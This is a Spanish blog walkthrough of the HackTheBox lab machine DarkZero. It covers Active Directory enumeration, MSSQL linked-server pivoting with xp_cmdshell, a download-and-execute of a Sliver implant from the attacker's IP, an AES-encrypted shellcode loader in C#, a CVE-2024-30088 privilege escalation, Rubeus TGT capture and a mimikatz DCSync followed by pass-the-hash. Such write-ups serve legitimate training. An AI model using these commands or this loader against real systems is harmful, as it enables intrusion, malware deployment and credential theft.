---
layout: single
title: "Machines - DarkZero (HTB)"
author_profile: true
published: true
toc: true
toc_sticky: true
---

Las máquinas (de HackTheBox) son retos gamificados enfocados a __Red Team__ o por lo menos, __seguridad ofensiva__, donde tendrás que intentar __tomar control total__ de la máquina que tengas adelante abusando de vulnerabilidades practicando todo el proceso de _pentesting_ como la _obtención de información_, _explotación_ para obtener un _Foothold_, y luego seguir con generalmente, _movimiento lateral_ y finalmente, la _escalada de privilegios_; Estos laboratorios son especialmente útiles para probar conceptos de seguridad ofensiva ya que tendrás que abusar de ellos para seguir avanzando.

![UTMP]({{ "/images/darkzero/logo.png" | relative_url }}){: .align-center}

## Resumen DarkZero

Esta máquina __Windows__ Es un path bastante sencillo (aunque con truco haha), que, en _HTB Academy_ 2 módulos hacen exactamente lo que hacemos en el laboratorio:

1. __Enumeración__ - Un refrito, utilizar nmap, conocer la red y los servicios que se ejecutan.
2. __Intentando Obtener un foothold__ - Estaremos enumerando bastantes cosas para intentar obtener un foothold en el dominio.
3. __Interacción con MSSQL__ - Accedemos y enumeramos el servicio MSSQL.
4. __Pivoting por Linked Database__ - Pivotamos de MSSQL (`DC01`) al `DC02` gracias a un _Linked Database_ y Ejecución de comandos.
5. __Local Privilege Escalation - CVE-2024-30088__ - Enumeramos y encontramos una versión de windows vulnerable a un CVE.
6. __Domain Take Over DCSync__ - Abusando de un _Forest bidirectional trust_ hacemos un `DCSync` para dumpear cuentas del primer dominio.

## Laboratorio

### Enumeración

Como siempre, iniciamos con un análisis de `nmap` contra el objetivo: __Escaneando todos los puertos (-p-)__, __desabilitando la resolución dns (-n)__, __deshabilitando el ping scan (-Pn)__ (usado para determinar si el host está activo), __filtrando por sólo puertos abiertos (--open)__ y finalmente, __reportándolo en formato grepeable (-oG)__:

```js
❯ nmap -p- --min-rate 5000 -n -Pn 10.10.11.89 --open -oG allports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-09 15:35 CST
Nmap scan report for 10.10.11.89
Host is up (0.19s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49666/tcp open  unknown
49684/tcp open  unknown
49905/tcp open  unknown
49935/tcp open  unknown
49971/tcp open  unknown
63306/tcp open  unknown
63503/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 106.31 seconds

```

La primera vista es que estamos claramente ante una máquina de __Active Directory__, seguimos escaneando para ver si existe alguna versión vulnerable en alguno de los servicios y para ello, utilizamos `nmap` esta vez, __habilitando el footprinting de versión del servicio (-sV)__ junto con los __scripts por defecto de nmap (-sC)__, todo reportándolo en un __formato de archivo nmap (-oN Openports)__ 

```js
❯ nmap -p53,88,135,139,389,445,464,593,636,1433,2179,3268,3269,5985,9389,49664,49666,49684,49905,49935,49971,63306,63503 -n -Pn -sCV 10.10.11.89 -oN Openports
Nmap scan report for 10.10.11.89
Host is up (0.38s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-10 04:44:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported!>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported!>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-10T02:17:58
|_Not valid after:  2055-10-10T02:17:58
|_ssl-date: 2025-10-10T04:46:10+00:00; +7h00m00s from scanner time.
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported!>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported!>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49905/tcp open  msrpc         Microsoft Windows RPC
49935/tcp open  msrpc         Microsoft Windows RPC
49971/tcp open  msrpc         Microsoft Windows RPC
63306/tcp open  msrpc         Microsoft Windows RPC
63503/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-10T04:45:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct  9 15:46:14 2025 -- 1 IP address (1 host up) scanned in 118.27 seconds
```

### Intentando Obtener un foothold

Nada demasiado importante por el momento, más que `MSSQL` pero podemos enumerar más cosas antes para descartar vulnerabilidades sencillas. Total, como estamos acostumbrados, vemos el `lock-skew` de 7 horas, por lo que podemos utilzar `ntpdate` para sincronizar nuestro reloj con el _Domain Controller_

```bash
❯ sudo ntpdate -v 10.10.11.89
2025-10-09 22:55:16.829006 (-0600) +25199.871790 +/- 0.114583 10.10.11.89 s1 no-leap
CLOCK: time stepped by 25199.871790
```

Con ello, ya sincronizamos nuestro reloj y, claro, no nos olvidemos de registrar el dominio en el `/etc/hosts` para su resolución DNS agregando la siguiente linea:

```js
10.10.11.89 dc01.darkzero.htb darkzero.htb
```

Ahora, probamos las credenciales que nos han dado __john.w / RFulUtONCOL!__ con `netexec` y partimos desde aquí buscando cómo podemos ingresar al dominio, iniciando con la lectura de los shares

```js
❯ netexec smb 10.10.11.89 -u "john.w" -p "RFulUtONCOL\!" --shares
SMB         10.10.11.89     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.89     445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
SMB         10.10.11.89     445    DC01             [*] Enumerated shares
SMB         10.10.11.89     445    DC01             Share           Permissions     Remark
SMB         10.10.11.89     445    DC01             -----           -----------     ------
SMB         10.10.11.89     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.89     445    DC01             C$                              Default share
SMB         10.10.11.89     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.89     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.89     445    DC01             SYSVOL          READ            Logon server share 
```

O de los usuarios:

```js
❯ netexec smb 10.10.11.89 -u "john.w" -p "RFulUtONCOL\!" --users                      
SMB         10.10.11.89     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.89     445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
SMB         10.10.11.89     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.89     445    DC01             Administrator                 2025-09-10 16:42:44 0       Built-in account for administering the computer/domain 
SMB         10.10.11.89     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.89     445    DC01             krbtgt                        2025-07-29 11:40:16 0       Key Distribution Center Service Account 
SMB         10.10.11.89     445    DC01             john.w                        2025-07-29 15:33:53 0        
SMB         10.10.11.89     445    DC01             [*] Enumerated 4 local users: darkzero
```

Y probamos enumerar utilizando la extensión `spider_plus`

```js
❯ netexec smb 10.10.11.89 -u "john.w" -p "RFulUtONCOL\!" -m spider_plus
<SNIP!>
```

La mala noticia es que no encontraremos mucho (incluso descargando los archivos); y poco queda que hacer, podríamos tirar de `responder` para intentar obtener un hash `NTLMv2` por si el `DC` está utilizando `LLMNR` u otro protocolo, pero no será el caso. Pero igual es bueno ir descartando cosas por si nos quedamos de algo sin cubrir.

Tiramos ahora de lo que podemos: `bloodhound` por si hay algo que no estamos viendo.

```js
❯ bloodhound.py -u "john.w" -p "RFulUtONCOL\!" -d darkzero.htb -dc dc01.darkzero.htb -ns 10.10.11.89 --zip -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: darkzero.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.darkzero.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.darkzero.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 5 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.darkzero.htb
INFO: Done in 01M 03S
INFO: Compressing output into 20251010000326_bloodhound.zip
```

Este último comando, va a obtener la información necesaria y la ingresará a un archivo zip, lo que debemos hacer ahora es importarlo a la GUI de `bloodhound` Y examinar los resultados.

En una búsqueda, veremos una vía potencial o incluso, una pista de lo que sigue:

![UTMP]({{ "/images/darkzero/bloodhound.png" | relative_url }}){: .align-center}

Esto indica que hay un trust bilateral de 2 forests `darkzero.htb` (En el que está el DC Objetivo) y `darkzero.ext`; y esto es muy dependiendo de la configuración, pero el takeover de uno, puede indicar el takeover del otro, así que podemos empezar a buscar cómo saltar a este segundo `DC`.

### Interacción con MSSQL

Recordando desde la enumeración, teníamos `mssql` en el puerto `1433`; así que podemos probar nuestras credenciales ante este servicio utilizando `netexec`:

```js
❯ netexec mssql 10.10.11.89 -u john.w -p RFulUtONCOL\!
MSSQL       10.10.11.89     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb)
<MSSQL       10.10.11.89     1433   DC01             [+] darkzero.htb\john.w:RFulUtONCOL!
```

Una vez que confirmamos las credenciales, podemos conectarnos mediante `impacket-mssqlclient.py` 

```js
❯ impacket-mssqlclient.py 'darkzero.htb/john.w:RFulUtONCOL!'@10.10.11.89 -windows-auth
Impacket v0.13.0.dev0+20250605.14806.5f78065 - Copyright Fortra, LLC and its affiliated companies 
<SNIP!>
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> 
```

Claro, podemos empezar a leer si contiene información relevante:

```js
SQL (darkzero\john.w  guest@master)> select name from master.dbo.sysdatabases
name     
------   
master   

tempdb   

model    

msdb     
```

A parte de las bases de datos por defecto, no encontramos mucho más, podemos ahora intentar ejecución de comandos:

```js
SQL (darkzero\john.w  guest@master)> xp_cmdshell ''whoami''
ERROR(DC01): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (darkzero\john.w  guest@master)> EXECUTE sp_configure 'show advanced options', 1
ERROR(DC01): Line 105: User does not have permission to perform this action.
```

Parece que la acción está restringida, ahora buscamos si podemos impersonificar a algun usuario:

```js
SQL (-@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name   
---- 
```

Pero no devuelve nada, Ahora, algo común es que se pueden conectar bases de datos mediante `linked servers`, especialmente cuando busca ejecutarse una búsqueda SQL transaccional que incluso, puede incluir tablas en otra instancia de SQL o incluso otro producto como `Oracle`

```js
SQL (darkzero\john.w  guest@master)> SELECT srvname, isremote FROM sysservers
srvname             isremote   
-----------------   --------   
DC01                       1   

DC02.darkzero.ext          0   
```

### Pivoting por Linked Database

Bingo, `1` significa que es un servidor remoto, y el `0` indica que es un `linked server` y como vimos, si logramos conectarnos y escalamos en este forest `darkzero.ext` es el compromiso del `darkzero.htb`.

Para ejecutar queries en un `linked server` podemos utilizar la instrucción `EXECUTE` especificando en qué `linked server` quiere ejecutarse:

```SQL
SQL (darkzero\john.w  guest@master)> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [DC02.darkzero.ext]

-   -   -   -   
1   1   1   1
```

Esto es suficiente para probar la conexión, ahora podemos intentar ejecutar comandos (cuando utilizamos este método, tenemos que escapar las comillas con otras comillas):

```SQL
SQL (darkzero\john.w  guest@master)> EXECUTE('xp_cmdshell ''whoami''') AT [DC02.darkzero.ext]
ERROR(DC02): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

Este error indica que sólo está deshabilitado, no que no pueda utilizarse, entonces, hacemos el típico método para habilitarlo:

* `EXECUTE sp_configure 'show advanced options', 1` - Permitir modificar las opciones avanzadas
* `RECONFIGURE` - Hacer el update a los cambios
* `EXECUTE sp_configure 'xp_cmdshell', 1` - Habilitar el feature
* `RECONFIGURE` - Hacer el update a los cambios

```SQL
SQL (darkzero\john.w  guest@master)> EXECUTE('EXECUTE sp_configure ''show advanced options'', 1') AT [DC02.darkzero.ext]
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (darkzero\john.w  guest@master)> EXECUTE('RECONFIGURE') AT [DC02.darkzero.ext]

SQL (darkzero\john.w  guest@master)> EXECUTE('EXECUTE sp_configure ''xp_cmdshell'', 1') AT [DC02.darkzero.ext]
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (darkzero\john.w  guest@master)> EXECUTE('RECONFIGURE') AT [DC02.darkzero.ext]

SQL (darkzero\john.w  guest@master)> EXECUTE('xp_cmdshell ''whoami''') AT [DC02.darkzero.ext]
output                 
--------------------   
darkzero-ext\svc_sql   

NULL     

```

Listo, tenemos ejecución de comandos sobre el `DC02`; ahora, para entablar la comunicación podemos tirar de cualquier cosa que nos establezca una reverse shell, como por ejemplo `metasploit` (crear el ejecutable, iniciar el `msfconsole`, subirlo, ejecutarlo y obtener la sesión) pero esta vez utilizaré `sliver`:

#### Preparación Sliver

Iniciando el framework sólo haría falta hacer los perfiles con nuestras preferencias indicando los detalles del `stage listener` y el servidor en sí:

```js
sliver > profiles new --http 10.10.16.77:8080 --format shellcode Banana

[*] Saved new implant profile Banana

sliver > stage-listener --url tcp://10.10.16.77:80 --profile Mandarina

[!] Profile not found

sliver > stage-listener --url tcp://10.10.16.77:80 --profile Banana

[*] No builds found for profile Banana, generating a new one
[*] Sliver name for profile Banana: MUDDY_CLAVICLE
[*] Job 2 (tcp) started

http -L <Local_IP> -l <Http Listener Port>
[*] Job 3 (http) started

sliver > generate stager --lhost 10.10.16.77 --lport 80 --format csharp --save Stager.sc

[*] Sliver implant stager saved to: .../DarkZero/Stager.sc
```

Entonces, con nuestro shellcode, sólo haría falta copiarlo, e implementarlo en algún cargador que tengamos, En mi caso, quería implementarlo con :

```cs
using System;
using System.Linq;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace SliverExec
{
    internal class Program
    {
        //<Imports>

        static void Main(string[] args)
        {
            string bufEnc = "<ShellCodeCodificado>";

            Aes aes = Aes.Create();
            byte[] key = new byte[16] { <Clave 16 Bytes> };
            byte[] iv = new byte[16] { <IV 16 Bytes> };
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);

            byte[] buf;
            using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
            {
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (var msPlain = new System.IO.MemoryStream())
                    {
                        csDecrypt.CopyTo(msPlain);
                        buf = msPlain.ToArray();
                    }
                }
            }

            IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x1000, 0x04);

            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

            UInt32 lpflOldProtect;
            VirtualProtect(lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);

            UInt32 lpThreadId = 0;
            IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);

            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
}

```

Ahora, sólo haría falta comprobar si es que tenemos contacto con este `DC02` remoto, lo que podemos probar con `ping`:

```js
// Del Lado de la sesión remota
SQL (darkzero\john.w  guest@master)> EXECUTE('xp_cmdshell ''powershell -c ping 10.10.16.77'' ') AT [DC02.darkzero.ext]
// Del lado de nuestra máquina local
❯ sudo tcpdump -i tun0 icmp
```

Y al ejecutarlo, notaremos la respuesta:

```h
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
06:36:28.605337 IP dc01.darkzero.htb > 10.10.16.77: ICMP echo request, id 1000, seq 169, length 40
06:36:28.605387 IP 10.10.16.77 > dc01.darkzero.htb: ICMP echo reply, id 1000, seq 169, length 40
```

#### Descarga y Ejecución Sliver

Una vez confirmada la conexión tiramos de wget y descargamos el archivo malicioso:

```js
SQL (darkzero\john.w  guest@master)> EXECUTE('xp_cmdshell ''powershell -c wget http://10.10.16.77:11601/Task.exe -Outfile C:/Windows/Tasks/Task.exe'' ') AT [DC02.darkzero.ext]
output   
------   
NULL  
SQL (darkzero\john.w  guest@master)> EXECUTE('xp_cmdshell ''powershell -c C:/Windows/Tasks/Task.exe'' ') AT [DC02.darkzero.ext]
```

Y pronto recibiremos la conexión en `Sliver`:

```js
[*] Session 5c0c6753 MUDDY_CLAVICLE - 10.10.11.89:56902 (DC02) - windows/amd64 - Mon, 13 Oct 2025 06:43:30 CST

sliver > sessions 

 ID         Name             Transport   Remote Address      Hostname   Username               Operating System   Locale   Last Message                            Health  
========== ================ =========== =================== ========== ====================== ================== ======== ======================================= =========
 5c0c6753   MUDDY_CLAVICLE   http(s)     10.10.11.89:56902   DC02       darkzero-ext\svc_sql   windows/amd64      en-US    Mon Oct 13 06:44:44 CST 2025 (3s ago)   [ALIVE] 

sliver > use 5c0c6753-5e45-4296-86ba-bdae827b0d69

[*] Active session MUDDY_CLAVICLE (5c0c6753-5e45-4296-86ba-bdae827b0d69)

sliver (MUDDY_CLAVICLE) > 
```

Bien, ahora con nuestra sesión, podemos hacer muchas más cosas, así que empecemos con la enumeración:

```js
sliver (MUDDY_CLAVICLE) > execute -o systeminfo

[*] Output:

Host Name:                 DC02
OS Name:                   Microsoft Windows Server 2022 Datacenter
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
<SNIP!>
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Aquí ya detectamos una bandera roja: La versión `10.0.20348 N/A Build 20348` es vulnerable a un LPE: `CVE-2024-30088` el cual afecta hasta la versión `10.0.20348 N/A Build 2527` Para una lista de las builds, podemos utilizar la [lista oficial de Microsoft](https://support.microsoft.com/en-us/topic/june-11-2024-kb5039227-os-build-20348-2527-894a0e2d-6b5f-4c5b-9e61-82f45024ff4f).

### Local Privilege Escalation - CVE-2024-30088

Ahora bien, podemos utilizar el PoC de metasploit (ya que cuenta con un módulo para él) o, puedes utilziar el de un repositorio de [GitHub con el PoC](https://github.com/tykawaii98/CVE-2024-30088)

En el segundo caso, tendrás que modificarlo para ejecutar tu stager y compilarlo (Pasos que no cubriré).

Una vez con el ejecutable listo; lo subimos con el comando `upload` desde `Sliver` y lo ejecutamos con `execute`:

```js
sliver (MUDDY_CLAVICLE) > upload /home/path/To/exploits/poc.exe
sliver (MUDDY_CLAVICLE) > execute -o C:\\Windows\\Tasks\\poc.exe

[!] rpc error: code = Unknown desc = implant timeout
sliver (MUDDY_CLAVICLE) > sessions 

[*] Session 2a45a5b0 MUDDY_CLAVICLE - 10.10.11.89:50168 (DC02) - windows/amd64 - Mon, 13 Oct 2025 08:04:00 CST

sliver (MUDDY_CLAVICLE) > sessions

 ID         Name             Transport   Remote Address      Hostname   Username               Operating System   Locale   Last Message                            Health  
========== ================ =========== =================== ========== ====================== ================== ======== ======================================= =========
 2a45a5b0   MUDDY_CLAVICLE   http(s)     10.10.11.89:50168   DC02       NT AUTHORITY\SYSTEM    windows/amd64      en-US    Mon Oct 13 08:05:28 CST 2025 (2s ago)   [ALIVE] 
 7253834c   MUDDY_CLAVICLE   http(s)     10.10.11.89:50165   DC02       darkzero-ext\svc_sql   windows/amd64      en-US    Mon Oct 13 08:05:29 CST 2025 (1s ago)   [ALIVE] 
```

Aunque hayamos recibido el __Implant Timeout__ recibimos satisfactoriamente la sesión como la poderosísima `NT AUTHORITY\SYSTEM`; 

### Domain Take Over DCSync

Ahora, __¿qué sigue?__ Definitivamente podemos intentar varias cosas, intentar hacer un _Golden Ticket_, pero lamentablemente, el dominio sí está configurado correctamente para que un dominio externo, no pueda impersonificar a una cuenta del dominio interno pero no todo está perdido. ¿Qué tal, ya que controlamos el `DC02`, por qué no intentamos hacer que el `DC01` se autentique contra nosotros?.

Con este proceso, podemos obtener el `TGT` del `DC01` y hacer un `DCSync`

Entonces, tenemos algo claro a probar: Un `DCSync` pero recuerda que va con truco: necesitamos impersonificar al `DC01` y cómo lo hacemos?, Haciendo una solicitud desde `mssql`; veamos cómo funciona:

En una sesión de shell, subimos `rubeus` para empezar a monitorear los cambios en los tickets:

```js
sliver (MUDDY_CLAVICLE) > upload /home/n1c37ry05/Documents/Tools/windows/windows_Tooling/SharpCollection/NetFramework_4.0_Any/Rubeus.exe

[*] Wrote file to C:\Windows\Tasks\Rubeus.exe

sliver (MUDDY_CLAVICLE) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 168

PS C:\Windows\Tasks> ./Rubeus.exe monitor /interval:10
./Rubeus.exe monitor /interval:10

 (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: TGT Monitoring
[*] Monitoring every 10 seconds for new TGTs


[*] 10/13/2025 5:05:33 PM UTC - Found new TGT:

  <SNIP!>

```

Mientras que en `MSSQL` hacemos una petición para que solicite el `DC01` un ticket al `DC02` que es justo donde estamos a la escucha:

```js
SQL (darkzero\john.w  guest@master)> EXEC master..xp_dirtree '\\dc02.darkzero.ext\c$'
subdirectory   depth   
------------   -----   
```

Y pronto, recibiremos en el lado de `Rubeus` un TGT:

```js
[*] 10/13/2025 5:07:03 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/13/2025 10:06:56 AM
  EndTime               :  10/13/2025 8:06:56 PM
  RenewTill             :  10/20/2025 10:06:56 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRn
    <SNIP!>=
```

Ahora, necesitamos tratar el ticket, que está codificado en Base64, así que lo guardamos en un archivo

```js
[System.IO.File]::WriteAllBytes("C:\windows\temp\dc01.kirbi",[System.Convert]::FromBase64String("doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIE<SNIP!>"))
```

Finalmente, sólo tenemos que utilizar `mimikatz` para hacer un `dcsync` sobre el `DC01` para obtener el hash del usuario `Administrador`, o quien quisiéramos en realidad:

```js
PS C:\Windows\Tasks> ./mimikatz.exe "privilege::debug" "kerberos::ptt C:\windows\temp\dc01.kirbi" "lsadump::dcsync /domain:darkzero.htb /user:Administrator" "exit"
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # kerberos::ptt C:\windows\temp\dc01.kirbi

* File: 'C:\windows\temp\dc01.kirbi': OK

mimikatz(commandline) # lsadump::dcsync /domain:darkzero.htb /user:Administrator
[DC] 'darkzero.htb' will be the domain
[DC] 'DC01.darkzero.htb' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 9/10/2025 9:42:44 AM
Object Security ID   : S-1-5-21-1152179935-589108180-1989892463-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 5917517bdf2ef0c2b0a869a1cca40726
```

Y con ello, sólo tenemos que hacer _Pass The Hash_ y estamos servidor con un control total sobre el dominio:

```js
❯ evil-winrm -H 5917517bdf2ef0c2b0a869a1cca40726 -u Administrator -i 10.10.11.89
<SNIP!>
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
darkzero\administrator
```

###### Agradecimiento

Si lees esto, gracias por llegar hasta aquí!, si existen dudas, comentarios y correcciones (que son más que bienvenidas) contáctame con confianza, que siempre he dicho que la ciberseguridad es esfuerzo conjunto. 

En caso que no los vea, buenos días, buenas tardes y buenas noches. Happy Hacking!.
